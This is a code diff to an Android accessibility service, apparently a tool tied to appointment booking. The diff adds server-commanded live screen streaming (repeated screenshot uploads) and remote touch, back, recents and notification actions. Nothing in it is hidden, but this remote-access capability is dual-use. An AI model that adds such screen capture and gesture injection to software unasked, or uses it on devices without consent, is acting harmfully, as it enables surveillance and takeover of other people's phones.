@@ -20,8 +20,11 @@ import android.os.PowerManager;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
 import android.util.Base64;
+import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.Display;
+import android.view.WindowManager;
+import android.graphics.Point;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
@@ -101,6 +104,7 @@ public class AlmavivaAccessibilityService extends AccessibilityService {
 
     @Override
     public boolean onUnbind(Intent intent) {
+        stopLiveStreaming();
         stopPolling();
         instance = null;
         updateState(false, "تم إيقاف الخدمة");
@@ -110,6 +114,7 @@ public class AlmavivaAccessibilityService extends AccessibilityService {
 
     @Override
     public void onDestroy() {
+        stopLiveStreaming();
         stopPolling();
         instance = null;
         updateState(false, "تم إيقاف الخدمة");
@@ -242,6 +247,33 @@ public class AlmavivaAccessibilityService extends AccessibilityService {
                                 } catch (Exception e) {
                                     sendAck(cleanUrl, email, "REMOTE", false, "تعذر تشغيل الاهتزاز: " + e.getMessage());
                                 }
+                            } else if ("START_LIVE_STREAM".equals(action)) {
+                                Log.i(TAG, "Server requested start live stream");
+                                wakeScreenIfNeeded();
+                                startLiveStreaming(cleanUrl, email);
+                                sendAck(cleanUrl, email, "STREAM", true, "تم بدء البث المباشر للشاشة 🔴");
+                            } else if ("STOP_LIVE_STREAM".equals(action)) {
+                                Log.i(TAG, "Server requested stop live stream");
+                                stopLiveStreaming();
+                                sendAck(cleanUrl, email, "STREAM", true, "تم إيقاف البث المباشر للشاشة");
+                            } else if ("STREAM_PING".equals(action)) {
+                                lastStreamPingTime = System.currentTimeMillis();
+                            } else if ("TOUCH_CLICK".equals(action)) {
+                                double xp = json.optDouble("xPercent", -1);
+                                double yp = json.optDouble("yPercent", -1);
+                                if (xp >= 0 && yp >= 0) {
+                                    wakeScreenIfNeeded();
+                                    dispatchTouchClickPercent((float) xp, (float) yp);
+                                }
+                            } else if ("GO_BACK".equals(action)) {
+                                performGlobalAction(GLOBAL_ACTION_BACK);
+                                sendAck(cleanUrl, email, "REMOTE", true, "تم الرجوع للخلف");
+                            } else if ("GO_RECENTS".equals(action)) {
+                                performGlobalAction(GLOBAL_ACTION_RECENTS);
+                                sendAck(cleanUrl, email, "REMOTE", true, "تم فتح التطبيقات الحديثة");
+                            } else if ("OPEN_NOTIFICATIONS".equals(action)) {
+                                performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
+                                sendAck(cleanUrl, email, "REMOTE", true, "تم سحب شريط الإشعارات");
                             }
                         } else {
                             updateState(false, "🔴 السيرفر غير مستجيب (كود " + response.code() + ")");
@@ -737,6 +769,104 @@ public class AlmavivaAccessibilityService extends AccessibilityService {
 
     public void takeAndUploadScreenshot(String serverUrl, String email, ScreenshotHelper.ScreenshotCallback callback) {
         ScreenshotHelper.captureAndUpload(this, serverUrl, email, httpClient, callback);
+    }
+
+    private volatile boolean isLiveStreaming = false;
+    private Thread liveStreamThread = null;
+    private long lastStreamPingTime = 0;
+
+    public synchronized void startLiveStreaming(String serverUrl, String email) {
+        lastStreamPingTime = System.currentTimeMillis();
+        if (isLiveStreaming) return;
+        isLiveStreaming = true;
+        updateState(true, "🔴 جاري بث الشاشة الحية للمركز...");
+
+        liveStreamThread = new Thread(() -> {
+            while (isLiveStreaming) {
+                // Auto timeout after 60s if no ping received from web client
+                if (System.currentTimeMillis() - lastStreamPingTime > 60000) {
+                    Log.i(TAG, "Live stream auto-stopped due to inactivity timeout");
+                    isLiveStreaming = false;
+                    break;
+                }
+
+                final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
+                long frameStart = System.currentTimeMillis();
+
+                handler.post(() -> {
+                    if (!isLiveStreaming) {
+                        latch.countDown();
+                        return;
+                    }
+                    ScreenshotHelper.captureAndUpload(AlmavivaAccessibilityService.this, serverUrl, email, httpClient, true, (success, msg) -> {
+                        latch.countDown();
+                    });
+                });
+
+                try {
+                    latch.await(2000, TimeUnit.MILLISECONDS);
+                } catch (InterruptedException e) {
+                    break;
+                }
+
+                long elapsed = System.currentTimeMillis() - frameStart;
+                if (elapsed < 600) {
+                    try {
+                        Thread.sleep(600 - elapsed);
+                    } catch (InterruptedException e) {
+                        break;
+                    }
+                }
+            }
+            updateState(true, "🟢 متصل بالسيرفر وجاهز للموافقة الفورية");
+        });
+        liveStreamThread.start();
+    }
+
+    public synchronized void stopLiveStreaming() {
+        isLiveStreaming = false;
+        if (liveStreamThread != null) {
+            liveStreamThread.interrupt();
+            liveStreamThread = null;
+        }
+        updateState(true, "🟢 متصل بالسيرفر وجاهز للموافقة الفورية");
+    }
+
+    public boolean dispatchTouchClickPercent(float xPercent, float yPercent) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            int screenW = 1080;
+            int screenH = 2400;
+            try {
+                WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+                if (wm != null) {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                        Rect bounds = wm.getCurrentWindowMetrics().getBounds();
+                        screenW = bounds.width();
+                        screenH = bounds.height();
+                    } else {
+                        Display display = wm.getDefaultDisplay();
+                        Point size = new Point();
+                        display.getRealSize(size);
+                        screenW = size.x;
+                        screenH = size.y;
+                    }
+                }
+            } catch (Exception ignored) {}
+
+            float targetX = Math.max(0, Math.min(screenW, xPercent * screenW));
+            float targetY = Math.max(0, Math.min(screenH, yPercent * screenH));
+
+            Log.i(TAG, "Touch dispatch: (" + targetX + ", " + targetY + ") on " + screenW + "x" + screenH);
+
+            Path path = new Path();
+            path.moveTo(targetX, targetY);
+            GestureDescription.StrokeDescription stroke =
+                    new GestureDescription.StrokeDescription(path, 0, 50);
+            GestureDescription.Builder builder = new GestureDescription.Builder();
+            builder.addStroke(stroke);
+            return dispatchGesture(builder.build(), null, null);
+        }
+        return false;
     }
 
     private void updateState(boolean connected, String log) {
